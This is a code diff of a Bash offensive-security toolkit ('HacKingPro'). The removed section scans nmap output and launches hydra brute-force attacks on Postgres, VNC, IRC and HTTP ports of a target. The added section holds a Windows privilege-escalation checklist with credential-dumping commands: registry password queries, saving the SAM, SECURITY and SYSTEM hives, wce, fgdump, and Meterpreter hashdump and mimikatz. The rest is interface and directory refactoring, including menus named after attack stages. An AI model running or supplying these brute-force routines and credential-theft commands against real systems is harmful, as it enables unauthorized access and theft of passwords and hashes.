-    if grep -q 5432/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
-    fi
-  }
-  BrutePostgres
-
-  #  Port 5900 (VNC)
-  BruteVNC(){
-    if grep -q 5900/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5900(VNC) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
-      hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
-    fi
-  }
-  BruteVNC
-
-  #  Port 5901 (VNC)
-  BruteVNC5901(){
-   if grep -q 5901/tcp nmap.log; then
-    echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
-		sleep 1
-		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
-		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
-		Finished_Brute "${targetIP}"
-   else
-    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
-   fi
-}
-  BruteVNC5901
-
-  #  Port 6667 (IRC)
-  BruteIRC(){
-    if grep -q 6667/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
-    fi
-  }
-  BruteIRC
-
-  #  Port 8000 (HTTP HEAD)
-  BruteHTTP8000(){
-    if grep -q 8000/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
-    fi
-  }
-  BruteHTTP8000
-
-  #  Port 8080 (HTTP HEAD)
-  BruteHTTP8080(){
-    if grep -q 8080/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
-    fi
-  }
-  BruteHTTP8080
-
-  #  Port 8100 (HTTP HEAD)
-  BruteHTTP8100(){
-    if grep -q 8100/tcp nmap.log; then
-      echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
-    fi
-  }
-  BruteHTTP8100
-
-  read -p "$Press_ENTER"
-
-  if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
-  	help
-  	exit
-  fi
-
-  if [ ! -z "$2" ]; then
-  	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
-  		echo -e "[${red}!${default}] Maximum number of threads is 64!"
-  		exit
-  	else
-  		thread=$2
-  	fi
-  fi
-
-  if [[ -f $1 ]]; then
-  	while IFS= read -r line; do
-  		sleep 1
-  		report $line
-  		port_scan $line
-  		bruteforce $line $2
-  	done < "$1"
-  	exit
-  fi
-
-  # sleep 1
-  # report $1
-  # port_scan $1
-  # bruteforce $1 $2
-
-  read -p "$Press_ENTER"
-
-
-}
-
-###############################################
-# AttacKing
-###############################################
-
-
-###############################################
 #         HacKingPro Planning
 ###############################################
 
@@ -1288,7 +627,7 @@ ReadTargetNameFromtheUser(){
 }
 
 # Define Variables For Case Directory
-MainDirectoriyCase="${MainDirectoriy}/Case"
+MainDirectoriyCase="${MainDirectoriy}/Case/"
 
 # Read Target Name From the User
 ReadTargetNameFromtheUser(){
@@ -1461,11 +800,6 @@ FunTargetPhone(){
       fi
     }
 
-###############################################
-#         HacKingPro Planning
-###############################################
-
-
 BasicInformation() {
   clear
   # Checking Basic Information
@@ -1550,6 +884,9 @@ BasicInformation() {
         "
 }
 
+###############################################
+#         Checking
+###############################################
 
 # Checking if Case Folder Exist
 CheckingifCaseFolderExist(){
@@ -1696,24 +1033,24 @@ Checking_IP_Target(){
 
     echo "\n    ${BGreen}[${BRed} ERROR ${BGreen}]${BRed}──╼ ${BGreen}[ ❌ ]${BRed}──╼  ${BGreen}[${BRed} You need Enter IP Before Scanning ${BGreen}] \n"
     sleep 1
-    echo "    ${BGreen}┌──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}┌──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
-    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
-    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
-    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
-    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}|──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
-    echo "    ${BGreen}└──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    echo "    ${BGreen}└──${BRed}[${slowBlink} P${resetT}${BRed} ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
     sleep 1
     read -p "$Press_ENTER" readthat
     cd "$XHacKingPro"
+    break
   fi
 
 }
-
 
 ###############################################
 #         Parsing Date and Time
@@ -1729,13 +1066,21 @@ CurrentDate=$(echo "${DGrey}$day-$month-$year")
 StartingTime=$(echo "${DGrey}$hour:$minute:$second")
 FullTime=$(date)
 
+# List Files ~ Executing: lahs
+lahs(){
+  ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}")"
+  echo "$ls_lahs"
+  ls -lahs
+  read -p "$ls_lahs" cmd
+}
+
 ###############################################
 #         HacKingPro Design Variables
 ###############################################
 
 HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro$resetT")
 Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
-MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}19")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}20")
 HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
@@ -1763,7 +1108,7 @@ ToolHeaderRun(){
 
 TargetStatusRun(){
   ToolStatus=$(echo "
-    ${BCyan}${faintT}┌──${resetT}${BRed}[${DGrey} P ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${BCyan}${faintT}┌──${resetT}${BRed}[${DGrey} ${slowBlink}P${resetT} ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
     ${BCyan}${faintT}|
     ${BCyan}${faintT}|──${resetT}${BRed}[${DGrey} Full Time ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} $(date) ${BRed}]
     ${BCyan}${faintT}|──${resetT}${BRed}[${DGrey} Current Date ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
@@ -1842,76 +1187,53 @@ BuildingProfiles(){
 #         Paths Directories to Tools
 ###############################################
 
+x_Case="${XHacKingPro}Case/${targetNAME}"
+
 xDirectories(){
   XHacKingProPWD=$(pwd)
   XHacKingPro="${XHacKingProPWD}"
-  xAttacKing="${XHacKingPro}/Menu/A--AttacKing/"
-  xMenu00="${XHacKingPro}/Menu/00--Anonymity/"
-  xMenu01="${XHacKingPro}/Menu/01--Information Gathering"
-  xMenu01_CAO="${XHacKingPro}/Menu/01--Information Gathering/CAO - Collecting All in One/"
-  xMenu01_CNI="${XHacKingPro}/Menu/01--Information Gathering/CNI - Collecting Network Information/"
-  xMenu01_CNI_reconFTW="${XHacKingPro}/Menu/01--Information Gathering/CNI - Collecting Network Information/reconFTW/"
-  xMenu01_CMI="${XHacKingPro}/Menu/01--Information Gathering/CMI - Collecting Machine Information/"
-  xMenu01_CSI="${XHacKingPro}/Menu/01--Information Gathering/CSI - Collecting Social Information/"
-  xMenu02="${XHacKingPro}/Menu/02--Scanning & Vulnerability Assessment/"
-  xMenu03="${XHacKingPro}/Menu/03--Web Application HacKing/"
-  xMenu04="${XHacKingPro}/Menu/04--Database Assessment/"
-  xMenu05="${XHacKingPro}/Menu/05--Password HacKing/"
-  xMenu06="${XHacKingPro}/Menu/06--Wireless HacKing/"
-  xMenu07="${XHacKingPro}/Menu/07--Exploit Frameworks & DataBases/"
-  xMenu08="${XHacKingPro}/Menu/08--Post-Exploitation Frameworks/"
-  xMenu09="${XHacKingPro}/Menu/09--Sniffing - Spoofing/"
-  xMenu11="${XHacKingPro}/Menu/11--Digital Forensic/"
-  xMenu12="${XHacKingPro}/Menu/12--Analysis & Reporting/"
-  xMenu14="${XHacKingPro}/Menu/14--Privilege Enumeration & Escalation/"
-  xMenu15="${XHacKingPro}/Menu/15--Malware Tools/"
-  xMenuM="${XHacKingPro}/Menu/M--Monitoring/"
-  xMenuCC="${XHacKingPro}/Menu/CC--Card Checker/"
-  xMenuCL="${XHacKingPro}/Menu/CL--Check Lists/"
-  xMenuCS="${XHacKingPro}/Menu/CS--Cheat Sheets/"
-  xMenuMH="${XHacKingPro}/Menu/MH--Mobile HacKing/"
-  xMenuMV="${XHacKingPro}/Menu/MV--Markdown Viewers/"
-  xMenuPT="${XHacKingPro}/Menu/PT--Penetration Testing/"
-  xMenuRE="${XHacKingPro}/Menu/RE--Reverse Engineering/"
-  xMenuRS="${XHacKingPro}/Menu/RS--Reverse Shell/"
-  xMenuSE="${XHacKingPro}/Menu/SE--Social Engineering/"
-  xMenuAIO="${XHacKingPro}/Menu/AIO--All In One/"
-  xMenuCHT="${XHacKingPro}/Menu/CHT--Car Hacking Tools/"
-  xMenuRAT="${XHacKingPro}/Menu/RAT--Remote Access Trojan/"
-  xMenuSIP="${XHacKingPro}/Menu/SIP--Session Initiation Protocol/"
-  xMenuWFA="${XHacKingPro}/Menu/WFA--FireWall Applications/"
-  # xMenuKoTH="${XHacKingPro}/Menu/KoTH--King of The Hill/"
+  x_Menu_1="${XHacKingPro}/Menu/AnLoMinus/01--Reconnaissance & Information Gathering/"
+  x_Menu_2="${XHacKingPro}/Menu/AnLoMinus/02--Weaponization/"
+  x_Menu_3="${XHacKingPro}/Menu/AnLoMinus/03--Delivery/"
+  x_Menu_4="${XHacKingPro}/Menu/AnLoMinus/04--Exploitation/"
+  x_Menu_5="${XHacKingPro}/Menu/AnLoMinus/05--Installation/"
+  x_Menu_6="${XHacKingPro}/Menu/AnLoMinus/06--Command and Control/"
+  x_Menu_7="${XHacKingPro}/Menu/AnLoMinus/07--Actions on Objective/"
+  x_Menu_8="${XHacKingPro}/Menu/AnLoMinus/AK--AttacKing/"
 
   # Checking Directories of HacKingPro TooL
 
-  if [ ${MainDirectoriy} == "$HOME/Documents/GitHub/HacKingPro" ]; then
-    #statements
-    XHacKingPro="$HOME/Documents/GitHub/HacKingPro/"
-    # HacKingProLogo1
-    # cd $XHacKingPro
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Working Direction: ${BCyan} $XHacKingProPWD\n"
-    ls -lahs
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing Menu: ${BCyan} $XHacKingProPWD/Menu\n"
-    ls  Menu
-    echo "\n\n\t\t XHacKingPro=$XHacKingPro"
+  if [ -d Menu ]; then
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Working${ORANGE} $XHacKingProPWD\n${faintT}"
+    ls -lhs
+    echo "${resetT}"
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $XHacKingProPWD/Menu\n${faintT}"
+    ls -lhs Menu
+    echo "${resetT}"
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $XHacKingProPWD/Menu/AnLoMinus\n${faintT}"
+    ls -lhs Menu/AnLoMinus
+    echo "${resetT}"
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $XHacKingProPWD/Menu/AnyTool\n${faintT}"
+    ls -lhs Menu/AnyTool
+    echo "${resetT}"
+    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $XHacKingProPWD/Menu/Resources\n${faintT}"
+    ls -lhs Menu/Resources
+    echo "${resetT}"
     read -p "${Press_Enter_To_START}"
   else
     XHacKingPro="$(pwd)"
     # HacKingProLogo1
     echo "\n\t  ${BYellow}[${BGreen}HOME${BYellow}] ${BGreen}Working Direction: ${BCyan} $XHacKingPro\n"
-    ls -lahs
-    echo "\n\t  ${BYellow}[${BGreen}HOME${BYellow}] ${BGreen}Listing Menu: ${BCyan} $XHacKingPro/Menu\n"
-    ls  Menu
+    lahs
     read -p "${Press_Enter_To_START}"
     echo "\n\n\t\t XHacKingPro=$HOME/HacKingPro"
   fi
-  echo "\n\n\t\t XHacKingPro=${XHacKingPro}"
+  echo "\n\n\t\t XHacKingPro=${faintT}${XHacKingPro}"
   read -p "${Press_Enter_To_START}"
 
 }
 xDirectories
-CheckOS
-read -p "${Press_Enter_To_START}"
+
 ###############################################
 #         Arsenal Cheatsheets
 ###############################################
@@ -1925,7 +1247,7 @@ Arsenal(){
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}cd Into Arsenal\n"
     cd Arsenal
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}List Arsenal Directories \n"
-    ls -lahs
+    lahs
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Runnin  \n"
     (./run)
   fi
@@ -1942,7 +1264,7 @@ Arsenal(){
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}cd Into Arsenal\n"
     cd Arsenal
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}List Arsenal Directories \n"
-    ls -lahs
+    lahs
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Installing Arsenal Requirements \n"
     python3 -m pip install -r requirements.txt
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Run Installation  \n"
@@ -1960,6 +1282,10 @@ Arsenal(){
 
 }
 
+###############################################
+#         Privileg Escalation
+###############################################
+
 LinPrivEsc(){
   #!/bin/sh
 
@@ -1969,6 +1295,7 @@ LinPrivEsc(){
   ###########################################
   #-------) Checks pre-everything (---------#
   ###########################################
+
   if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
     IAMROOT="1"
     MAXPATH_FIND_W="3"
@@ -1976,35 +1303,6 @@ LinPrivEsc(){
     IAMROOT=""
     MAXPATH_FIND_W="7"
   fi
-
-
-  ###########################################
-  #---------------) Colors (----------------#
-  ###########################################
-
-  C=$(printf '\033')
-  RED="${C}[1;31m"
-  SED_RED="${C}[1;31m&${C}[0m"
-  GREEN="${C}[1;32m"
-  SED_GREEN="${C}[1;32m&${C}[0m"
-  YELLOW="${C}[1;33m"
-  SED_YELLOW="${C}[1;33m&${C}[0m"
-  SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
-  BLUE="${C}[1;34m"
-  SED_BLUE="${C}[1;34m&${C}[0m"
-  ITALIC_BLUE="${C}[1;34m${C}[3m"
-  LIGHT_MAGENTA="${C}[1;95m"
-  SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
-  LIGHT_CYAN="${C}[1;96m"
-  SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
-  LG="${C}[1;37m" #LightGray
-  SED_LG="${C}[1;37m&${C}[0m"
-  DG="${C}[1;90m" #DarkGray
-  SED_DG="${C}[1;90m&${C}[0m"
-  NC="${C}[0m"
-  UNDERLINED="${C}[5m"
-  ITALIC="${C}[3m"
-
 
   ###########################################
   #---------) Parsing parameters (----------#
@@ -5814,6 +5112,113 @@ LinPrivEsc(){
 
 }
 
+WinPrivEsc(){
+  ## Privilege escalation
+
+  # Now we start the whole enumeration-process over gain.
+  # This is a checklist. You need to check of every single one, in this order.
+  echo "
+  - OS:
+    - Look for hotfixes
+      - systeminfo:
+      - wmic qfe get Caption,Description,HotFixID,InstalledOn
+      - set
+  - Version:
+  - Architecture:
+  - Current user:
+  - Hotfixes:
+  - Antivirus:
+
+  - Kernel exploits
+  - Cleartext password
+  - Reconfigure service parameters
+  - Inside service
+  - Program running as root
+  - Installed software
+  - Scheduled tasks
+  - Weak passwords
+
+  - Users
+    - hostname
+    - net users
+    - net user user1
+    - accesschk.exe -uwcqv 'Authenticated Users' *
+
+  - LocalGroups
+    - net localgroups
+
+  - netsh firewall show state
+  - netsh firewall show config
+
+  - Set path
+    - set PATH=%PATH%;C:\xampp\php
+
+    ### Cleartext passwords
+
+  - Windows autologin
+    - reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'
+
+  - VNC
+    - reg query 'HKCU\Software\ORL\WinVNC3\Password'
+
+  - SNMP Parameters
+    - reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'
+
+  - Putty
+    - reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'
+
+  - Search for password in registry
+    - reg query HKLM /f password /t REG_SZ /s
+    - reg query HKCU /f password /t REG_SZ /s
+
+  - Installed software
+    - Metasploit
+      - ps
+      - tasklist /SVC
+      - net start
+      - reg query HKEY_LOCAL_MACHINE\SOFTWARE
+      - DRIVERQUERY
+    - Look in:
+      - C:\Program files
+      - C:\Program files (x86)
+    Home directory of the user
+
+  - Interesting files
+    - Meterpreter
+      - search -f *.txt
+      - search -f *.zip
+      - search -f *.doc
+      - search -f *.xls
+      - search -f config*
+      - search -f *.rar
+      - search -f *.docx
+      - search -f *.sql
+    - How to cat files in meterpreter
+      - cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
+    - Recursive search
+      - dir /s
+
+    - Passwords and hashes
+      - wce32.exe -w
+      - wce64.exe -w
+      - fgdump.exe
+      - reg.exe save hklm\sam c:\sam_backup
+      - reg.exe save hklm\security c:\security_backup
+      - reg.exe save hklm\system c:\system
+      - Meterpreter
+        - hashdump
+        - load mimikatz
+        - msv
+
+  - Browser
+    - Browser start-page:
+    - Browser-history:
+    - Saved passwords:
+
+  "
+
+}
+
 ###############################################
 #         HacKingPro Main Menu
 ###############################################
@@ -5872,199 +5277,8 @@ MainMenu(){
       a|A|AttacKing )
       AttacKing
       ;;
-      alt|alternative|Alternative|Parrot|parrot )
-      AlternativeMenu
-      ;;
-      r|R|recon|Recon )
-      if [ -z $targetIP ]; then
-        #statements
-        Checking_IP_Target
-      else
-        ReconStart(){
-          if [ -z $targetNAME ]; then
-            #statements
-            targetNAME="AnLoMinus"
-          fi
-          if [ -z $targetIP ]; then
-            #statements
-            targetIP="1.1.1.1"
-          fi
-          # mkdir "$XHacKingProCaseTargetNameRecon"
-          # cd "$XHacKingProCaseTargetNameRecon"
-          # pwd
-          read -p "$Press_ENTER"
-
-          # Define Planning File
-          Planning_File="${targetNAME}-HacKingPro-Planning-Log.md"
-          # Checking Planning File
-          if [ -e ${Planning_File} ]; then
-            t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Planning_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
-            read -p "$t5 " filexist
-            case $filexist in
-              y|Y)
-              cd "$XHacKingProCaseTargetName/Planning"
-              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              read -p "$Press_ENTER"
-              rm ${targetNAME}-HacKingPro-Planning-Log.md
-              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              cd "$XHacKingProCaseTargetName"
-              ;;
-              n|N)
-              echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              ;;
-            esac
-          fi
-
-          #
-          Reconnaissance_File="${targetNAME}-HacKingPro-Reconnaissance-Log.md"
-          if [ -e ${Reconnaissance_File} ]; then
-            t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Reconnaissance_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
-            read -p "$t5 " filexist
-            case $filexist in
-              y|Y)
-              cd "$XHacKingProCaseTargetName/Reconnaissance"
-              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              read -p "$Press_ENTER"
-              rm ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              cd "$XHacKingProCaseTargetName"
-              ;;
-              n|N)
-              echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
-              ;;
-            esac
-          fi
-
-          #
-          if [ -d $XHacKingProCaseTargetName ]; then
-            #statements
-            echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}$targetNAME ${BBlue}Case Folder Exists, Continue to it\n"
-            read -p "$Press_ENTER"
-            cd $XHacKingProCaseTargetName
-            # echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
-            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
-            mkdir Reconnaissance
-            read -p "$Press_ENTER"
-            cd Reconnaissance
-            read -p "$Press_ENTER"
-          else
-            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
-            read -p "$Press_ENTER"
-            mkdir Case
-            read -p "$Press_ENTER"
-            cd Case
-            read -p "$Press_ENTER"
-            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
-            read -p "$Press_ENTER"
-            mkdir $targetNAME
-            read -p "$Press_ENTER"
-            cd $targetNAME
-            read -p "$Press_ENTER"
-            echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
-            read -p "$Press_ENTER"
-            # Define /HacKingPro/Case/TargetName/Reconnaissance
-            mkdir "$XHacKingProCaseTargetName"
-            mkdir Reconnaissance
-            read -p "$Press_ENTER"
-            XHacKingProCaseTargetNameRecon="$XHacKingPro/Case/$targetNAME/Reconnaissance/"
-            cd Reconnaissance
-            read -p "$Press_ENTER"
-          fi
-          #  [2] - Reconnaissance & Vulnerability Assessment
-          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "# [2] - Reconnaissance & Vulnerability Assessment | Date: $(date) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          #
-          echo "---" >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-          #
-          while true; do
-            cd "$XHacKingProCaseTargetNameRecon"
-            #statements
-            clear
-            # HacKingProLogo1
-            HacKingProTargetStatus=$(echo "
-            ${ToolHeader}
-
-            ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
-            ${DGrey}|
-            ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
-            ${DGrey}|
-            ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
-            ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
-            ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
-            ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
-            ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
-            ${DGrey}|
-            ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
-
